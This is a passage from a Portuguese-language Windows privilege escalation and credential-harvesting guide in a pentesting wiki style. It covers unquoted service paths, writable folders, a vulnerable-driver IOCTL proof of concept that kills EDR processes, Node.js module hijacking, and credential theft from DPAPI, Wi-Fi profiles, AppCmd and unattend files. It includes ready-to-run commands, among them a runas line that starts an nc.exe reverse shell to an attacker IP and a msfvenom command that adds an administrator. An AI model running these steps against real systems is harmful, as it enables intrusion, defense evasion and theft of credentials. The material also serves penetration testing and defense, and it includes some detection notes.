for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Você pode detectar e explorar** esta vulnerabilidade com o metasploit: `exploit/windows/local/trusted\_service\_path` Você pode criar manualmente um binário de serviço com o metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ações de Recuperação

O Windows permite que os usuários especifiquem ações a serem executadas caso um serviço falhe. Esse recurso pode ser configurado para apontar para um binário. Se esse binário puder ser substituído, a escalada de privilégios pode ser possível. Mais detalhes podem ser encontrados na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicativos

### Aplicativos Instalados

Verifique as **permissões dos binários** (talvez você possa substituir um deles e realizar uma escalada de privilégios) e das **pastas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissões de Escrita

Verifique se você pode modificar algum arquivo de configuração para ler algum arquivo especial ou se pode modificar algum binário que será executado por uma conta de Administrador (schedtasks).

Uma forma de encontrar permissões fracas em pastas/arquivos no sistema é executar:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistência/execução por carregamento automático de plugin do Notepad++

O Notepad++ carrega automaticamente qualquer DLL de plugin presente nas subpastas `plugins`. Se houver uma instalação portátil/cópia com permissão de escrita, adicionar um plugin malicioso fornece execução automática de código dentro de `notepad++.exe` a cada inicialização (inclusive a partir de `DllMain` e callbacks de plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Executar na inicialização

**Verifique se você pode sobrescrever algum registro ou binário que será executado por outro usuário.**\
**Leia** a **página a seguir** para saber mais sobre **locais interessantes de autorun para escalar privilégios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Procure por possíveis drivers de **terceiros estranhos/vulneráveis**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se um driver expõe uma primitiva arbitrária de leitura/escrita no kernel (comum em handlers IOCTL mal projetados), você pode escalar privilégios roubando diretamente um token SYSTEM da memória do kernel. Consulte a técnica passo a passo aqui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race condition nos quais a chamada vulnerável abre um caminho do Object Manager controlado pelo atacante, atrasar deliberadamente a busca (usando componentes com comprimento máximo ou cadeias de diretórios profundas) pode aumentar a janela de microssegundos para dezenas de microssegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitivas de corrupção de memória de registry hive

Vulnerabilidades modernas em hives permitem preparar layouts determinísticos, abusar de descendentes graváveis de HKLM/HKU e converter corrupção de metadados em overflows de kernel paged-pool sem um driver customizado. Aprenda a cadeia completa aqui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusão de tipos no modo direto de `RtlQueryRegistryValues` a partir de caminhos controlados pelo atacante

Alguns drivers aceitam um caminho de registry vindo do userland, validam apenas se ele é uma string UTF-16 válida e, em seguida, chamam `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` com `RTL_QUERY_REGISTRY_DIRECT` em um escalar na stack, como `int readValue`. Se `RTL_QUERY_REGISTRY_TYPECHECK` estiver ausente, `EntryContext` será interpretado de acordo com o tipo **real** do registry, e não com o tipo esperado pelo desenvolvedor.

Isso cria duas primitivas úteis:

- **Confused deputy / oracle**: um caminho absoluto `\Registry\...` controlado pelo usuário permite que o driver consulte keys escolhidas pelo atacante, vaze sua existência por meio de códigos de retorno/logs e, às vezes, leia valores aos quais o caller não poderia acessar diretamente.
- **Corrupção de memória do kernel**: um destino escalar como `&readValue` passa a ser interpretado de forma confusa como um `REG_QWORD`, `UNICODE_STRING` ou buffer binário dimensionado, dependendo do tipo do valor do registry.

Notas práticas de exploração:

- **Mitigação no Windows 8+**: se a consulta atingir um **untrusted hive** com `RTL_QUERY_REGISTRY_DIRECT`, mas sem `RTL_QUERY_REGISTRY_TYPECHECK`, os callers do kernel sofrerão crash com `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para manter a explorabilidade, procure keys graváveis pelo atacante dentro de hives de sistema confiáveis, em vez de preparar os valores em `HKCU`.
- **Preparação em trusted hive**: use o NtObjectManager para enumerar descendentes graváveis de `\Registry\Machine` e execute novamente a varredura com um token **low-integrity** duplicado para encontrar keys acessíveis a partir de contextos sandboxed:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: uma escrita direta de 8 bytes em um `int` de 4 bytes corrompe dados adjacentes da stack e pode sobrescrever parcialmente um ponteiro de callback/função próximo.
- **`REG_SZ` / `REG_EXPAND_SZ`**: o modo direto espera que `EntryContext` aponte para uma `UNICODE_STRING`. Se o código primeiro carrega um `REG_DWORD` controlado pelo atacante em um escalar da stack e depois reutiliza esse mesmo buffer para uma leitura de string, o atacante controla `Length`/`MaximumLength` e influencia parcialmente o ponteiro `Buffer`, resultando em uma escrita de kernel semicontolada.
- **`REG_BINARY`**: para dados binários grandes, o modo direto trata o primeiro `LONG` em `EntryContext` como um tamanho de buffer com sinal. Se uma leitura anterior de `REG_DWORD` deixar um valor negativo controlado pelo atacante no escalar reutilizado, a próxima consulta de `REG_BINARY` copia bytes do atacante diretamente sobre slots adjacentes da stack, o que costuma ser o caminho mais simples para sobrescrever completamente um ponteiro de callback.

Padrão forte para hunting: **leituras heterogêneas do registro na mesma variável da stack sem reinicializá-la**. Procure por `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponteiros `EntryContext` reutilizados e caminhos de código nos quais a primeira leitura do registro controla se uma segunda leitura será realizada.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alguns drivers de terceiros assinados criam seu objeto de dispositivo com uma SDDL forte usando IoCreateDeviceSecure, mas esquecem de definir FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem essa flag, a DACL segura não é aplicada quando o dispositivo é aberto por meio de um caminho contendo um componente extra, permitindo que qualquer usuário sem privilégios obtenha um handle usando um caminho de namespace como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (de um caso real)

Quando um usuário consegue abrir o dispositivo, os IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e tampering. Exemplos de capacidades observadas na prática:
- Retornar handles com acesso total a processos arbitrários (roubo de token / shell SYSTEM via DuplicateTokenEx/CreateProcessAsUser).
- Leitura/escrita raw irrestrita em disco (tampering offline, técnicas de persistência no boot).
- Encerrar processos arbitrários, incluindo Protected Process/Light (PP/PPL), permitindo o kill de AV/EDR a partir do user land via kernel.

Padrão mínimo de PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigações para desenvolvedores
- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar objetos de dispositivo destinados a serem restringidos por uma DACL.
- Valide o contexto do chamador para operações privilegiadas. Adicione verificações de PP/PPL antes de permitir a terminação de processos ou o retorno de handles.
- Restrinja os IOCTLs (máscaras de acesso, METHOD_*, validação de entrada) e considere modelos brokered em vez de privilégios diretos no kernel.

Ideias de detecção para defensores
- Monitore aberturas em user-mode de nomes de dispositivos suspeitos (por exemplo, \\ .\\amsdk*) e sequências específicas de IOCTL indicativas de abuso.
- Aplique a vulnerable driver blocklist da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias allow/deny lists.


## PATH DLL Hijacking

Se você tiver **permissões de gravação dentro de uma pasta presente no PATH**, poderá conseguir sequestrar uma DLL carregada por um processo e **escalar privilégios**.

Verifique as permissões de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informações sobre como abusar desta verificação:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking de resolução de módulos do Node.js / Electron via `C:\node_modules`

Esta é uma variante de **uncontrolled search path** do **Windows** que afeta aplicações **Node.js** e **Electron** quando realizam um import bare, como `require("foo")`, e o módulo esperado está **ausente**.

O Node resolve os pacotes percorrendo a árvore de diretórios e verificando as pastas `node_modules` em cada diretório pai. No Windows, essa busca pode chegar à raiz do drive, portanto uma aplicação iniciada a partir de `C:\Users\Administrator\project\app.js` pode acabar consultando:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se um **usuário com poucos privilégios** puder criar `C:\node_modules`, ele poderá plantar um `foo.js` malicioso (ou uma pasta de pacote) e aguardar que um **processo Node/Electron com privilégios superiores** resolva a dependência ausente. O payload é executado no contexto de segurança do processo vítima, portanto isso se torna **LPE** sempre que o alvo for executado como administrador, a partir de uma scheduled task elevada ou de um service wrapper, ou por uma aplicação desktop privilegiada iniciada automaticamente.

Isso é especialmente comum quando:

- uma dependência é declarada em `optionalDependencies`
- uma biblioteca de terceiros envolve `require("foo")` em `try/catch` e continua em caso de falha
- um pacote foi removido dos builds de produção, omitido durante o packaging ou não foi instalado
- o `require()` vulnerável está profundamente dentro da dependency tree, em vez de estar no código principal da aplicação

### Procurando alvos vulneráveis

Use o **Procmon** para comprovar o caminho de resolução:

- Filtre por `Process Name` = executável alvo (`node.exe`, o EXE da aplicação Electron ou o processo wrapper)
- Filtre por `Path` `contains` `node_modules`
- Concentre-se em `NAME NOT FOUND` e na abertura final bem-sucedida em `C:\node_modules`

Padrões úteis de code review em arquivos `.asar` descompactados ou nos sources da aplicação:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploração

1. Identifique o **nome do pacote ausente** usando o Procmon ou a revisão do código-fonte.
2. Crie o diretório de consulta na raiz caso ele ainda não exista:
```powershell
mkdir C:\node_modules
```
3. Coloque um módulo com o nome exato esperado:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Acione a aplicação vítima. Se a aplicação tentar `require("foo")` e o módulo legítimo estiver ausente, o Node poderá carregar `C:\node_modules\foo.js`.

Exemplos reais de módulos opcionais ausentes que se encaixam nesse padrão incluem `bluebird` e `utf-8-validate`, mas a **técnica** é a parte reutilizável: encontre qualquer **bare import ausente** que um processo privilegiado do Windows Node/Electron resolva.

### Ideias de detecção e hardening

- Gere um alerta quando um usuário criar `C:\node_modules` ou gravar novos arquivos/pacotes `.js` nesse local.
- Procure processos com alta integridade lendo de `C:\node_modules\*`.
- Inclua todas as dependências de runtime nos ambientes de produção e audite o uso de `optionalDependencies`.
- Revise códigos de terceiros em busca de padrões silenciosos como `try { require("...") } catch {}`.
- Desative sondagens opcionais quando a biblioteca oferecer suporte a isso (por exemplo, algumas implantações de `ws` podem evitar a sondagem legada de `utf-8-validate` com `WS_NO_UTF_8_VALIDATE=1`).

## Rede

### Compartilhamentos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### arquivo hosts

Verifique se há outros computadores conhecidos codificados no arquivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Rede e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas abertas

Verifique se há **serviços restritos** a partir do exterior
```bash
netstat -ano #Opened ports?
```
### Tabela de roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Consulte esta página para ver comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**

[Mais comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
O binário `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você obtiver o usuário root, poderá escutar em qualquer porta (na primeira vez que usar `nc.exe` para escutar em uma porta, será perguntado via GUI se `nc` deve ser permitido pelo firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gerenciador de credenciais / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Windows Vault armazena credenciais de usuários para servidores, sites e outros programas nos quais o **Windows** pode **autenticar os usuários automaticamente**. À primeira vista, isso pode parecer que agora os usuários podem armazenar suas credenciais do Facebook, Twitter, Gmail etc., para que façam login automaticamente por meio dos navegadores. Mas não é assim.

O Windows Vault armazena credenciais que o Windows pode usar para autenticar os usuários automaticamente, o que significa que qualquer **aplicativo do Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode utilizar este Credential Manager** e o Windows Vault, usando as credenciais fornecidas em vez de os usuários inserirem o nome de usuário e a senha o tempo todo.

A menos que os aplicativos interajam com o Credential Manager, não acredito que seja possível que eles usem as credenciais de um determinado recurso. Portanto, se seu aplicativo quiser utilizar o vault, ele deverá de alguma forma **se comunicar com o credential manager e solicitar as credenciais desse recurso** ao vault de armazenamento padrão.

Use o `cmdkey` para listar as credenciais armazenadas na máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Então, você pode usar `runas` com as opções `/savecred` para usar as credenciais salvas. O exemplo a seguir chama um binário remoto por meio de um compartilhamento SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecido.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Observe que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ou o [módulo de Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) podem ser usados.

### DPAPI

A **Data Protection API (DPAPI)** fornece um método para a encriptação simétrica de dados, usado predominantemente no sistema operacional Windows para a encriptação simétrica de chaves privadas assimétricas. Essa encriptação utiliza um segredo do usuário ou do sistema para contribuir significativamente para a entropia.

A **DPAPI permite a encriptação de chaves por meio de uma chave simétrica derivada dos segredos de login do usuário**. Em cenários que envolvem a encriptação do sistema, ela utiliza os segredos de autenticação do domínio do sistema.

As chaves RSA de usuário encriptadas usando a DPAPI são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde `{SID}` representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) do usuário. **A chave DPAPI, armazenada junto com a master key que protege as chaves privadas do usuário no mesmo arquivo**, normalmente consiste em 64 bytes de dados aleatórios. (É importante observar que o acesso a esse diretório é restrito, impedindo a listagem de seu conteúdo por meio do comando `dir` no CMD, embora ele possa ser listado pelo PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Você pode usar o **mimikatz module** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **arquivos de credenciais protegidos pela senha mestra** geralmente estão localizados em:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Você pode usar o **módulo mimikatz** `dpapi::cred` com a `/masterkey` apropriada para descriptografar.\
Você pode **extrair muitas DPAPI** **masterkeys** da **memória** com o módulo `sekurlsa::dpapi` (se você for root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciais do PowerShell

As **credenciais do PowerShell** são frequentemente usadas para **scripting** e tarefas de automação como uma forma conveniente de armazenar credenciais criptografadas. As credenciais são protegidas usando **DPAPI**, o que normalmente significa que só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Para **descriptografar** credenciais do PowerShell a partir do arquivo que as contém, você pode fazer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexões RDP Salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos Executados Recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais da Área de Trabalho Remota**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use o módulo `dpapi::rdg` do **Mimikatz** com o `/masterkey` apropriado para **descriptografar quaisquer arquivos .rdg**\
Você pode **extrair muitas DPAPI masterkeys** da memória com o módulo `sekurlsa::dpapi` do **Mimikatz**

### Sticky Notes

As pessoas costumam usar o aplicativo StickyNotes em estações de trabalho Windows para **salvar senhas** e outras informações, sem perceber que ele é um arquivo de banco de dados. Esse arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurá-lo e examiná-lo.

### AppCmd.exe

**Observe que, para recuperar senhas do AppCmd.exe, você precisa ser Administrator e executar com um nível de High Integrity.**\
O **AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\
Se esse arquivo existir, é possível que algumas **credenciais** tenham sido configuradas e possam ser **recuperadas**.

Este código foi extraído do [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe .\
Os instaladores são **executados com privilégios de SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Informação de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registro (Credenciais)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chaves de Host SSH do Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chaves SSH no registro

Chaves privadas SSH podem ser armazenadas dentro da chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, portanto, verifique se há algo interessante nela:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se você encontrar alguma entrada dentro desse caminho, provavelmente será uma chave SSH salva. Ela é armazenada de forma criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre essa técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o serviço `ssh-agent` não estiver em execução e você quiser que ele seja iniciado automaticamente na inicialização, execute:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica não é mais válida. Tentei criar algumas chaves SSH, adicioná-las com `ssh-add` e fazer login via SSH em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe, e o procmon não identificou o uso de `dpapi.dll` durante a autenticação com chave assimétrica.

### Arquivos Unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Você também pode procurar esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_

Conteúdo de exemplo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups do SAM e SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure um arquivo chamado **SiteList.xml**

### Cached GPP Password

Anteriormente, havia um recurso que permitia a implantação de contas de administrador local personalizadas em um grupo de máquinas por meio do Group Policy Preferences (GPP). No entanto, esse método apresentava falhas de segurança significativas. Primeiro, os Group Policy Objects (GPOs), armazenados como arquivos XML no SYSVOL, podiam ser acessados por qualquer usuário do domínio. Segundo, as senhas dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.

